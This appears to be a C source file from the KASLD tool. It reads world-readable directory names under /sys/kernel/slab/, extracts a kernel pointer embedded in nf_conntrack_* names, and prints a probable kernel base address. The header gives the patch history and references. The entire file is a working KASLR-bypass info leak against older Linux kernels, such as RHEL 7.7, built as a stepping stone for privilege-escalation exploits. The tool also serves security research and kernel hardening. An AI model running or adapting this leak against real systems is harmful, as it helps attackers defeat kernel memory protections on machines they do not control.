// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve kernel pointer to `inet_net` structure from SysFS world-readable
// filename: `/sys/kernel/slab/nf_conntrack_<pointer>`.
//
// Patched in kernel v4.6~2^2~2 on 2016-05-14:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=31b0b385f69d8d5491a4bca288e25e63f1d945d0
//
// But still present in RHEL 7.7 as of 2019. Removed in RHEL 7.8 (2020).
//
// References:
// https://www.openwall.com/lists/kernel-hardening/2017/10/05/5
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=31b0b385f69d8d5491a4bca288e25e63f1d945d0
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned long get_kernel_addr_conntrack() {
  unsigned long addr = 0;
  const char *path = "/sys/kernel/slab/";
  const char *needle = "nf_conntrack_";
  char d_path[256];
  char *substr;
  char *endptr;
  struct dirent *dir;
  DIR *d;

  printf("[.] trying %snf_contrack_* ...\n", path);

  d = opendir(path);
  if (d == NULL) {
    perror("[-] opendir");
    return 0;
  }

  while ((dir = readdir(d)) != NULL) {
    if (dir->d_type != DT_DIR)
      continue;

    snprintf(d_path, sizeof(d_path), "%s", dir->d_name);

    substr = strstr(d_path, needle);

    if (substr == NULL)
      continue;

    addr = strtoul(&substr[strlen(needle)], &endptr, 16);

    if (addr >= KERNEL_VAS_START && addr <= KERNEL_VAS_END)
      break;

    addr = 0;
  }

  closedir(d);

  return addr;
}

int main() {
  unsigned long addr = get_kernel_addr_conntrack();
  if (!addr)
    return 1;

  printf("leaked inet_net struct pointer: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
